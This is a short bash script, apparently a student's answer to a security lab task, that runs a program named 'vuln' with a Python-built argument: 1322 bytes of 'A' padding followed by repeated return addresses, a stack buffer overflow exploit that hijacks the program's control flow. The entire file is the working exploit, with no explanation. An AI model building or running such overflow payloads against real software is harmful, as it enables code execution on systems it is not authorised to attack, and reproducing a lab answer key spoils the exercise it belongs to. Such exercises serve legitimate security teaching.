#!/usr/bin/env bash
/task2/s1803764/vuln "$(python -c "print('A'*1322 + '\x56\x85\x04\x08'*6 + '\x88\xdf\xff\xff' + '\x56\x85\x04\x08')")"